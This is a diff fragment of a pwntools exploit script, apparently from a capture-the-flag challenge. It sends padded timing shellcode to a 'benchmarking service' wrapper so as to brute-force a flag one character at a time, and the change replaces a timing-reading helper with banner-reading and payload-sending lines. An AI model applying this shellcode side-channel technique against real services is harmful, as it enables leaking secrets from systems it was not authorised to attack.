@@ -6,16 +6,8 @@ from pwn import *
 context.arch = 'amd64'
 context.log_level = 'info'
 
-def get_timing(p):
-    """Extract timing from process using recvuntil/recvline"""
-    try:
-        # Wait for "Time: " and get the number
-        p.recvuntil(b"Time: ")
-        timing_str = p.recvline().decode().strip()
-        return float(timing_str)
-    except Exception as e:
-        log.warning(f"Failed to get timing: {e}")
-        return 0.0
+def utf8len(s):
+    return len(s.encode('utf-8'))
 
 def create_timing_shellcode(position, character):
     shellcode = asm(f'''
@@ -78,6 +70,9 @@ def brute_force_flag():
                 else:
                     p = process(['python3', 'wrapper.py'], env=env)
 
+                p.recv(utf8len("======= BENCHMARKING SERVICE V1.0 =======\n"))
+                p.recv(utf8len("Shellcode: "))
+                p.send(pad_payload(shellcode, 1024))
                 # Wait for prompt
                 p.recvuntil(b"Shellcode: ")
 
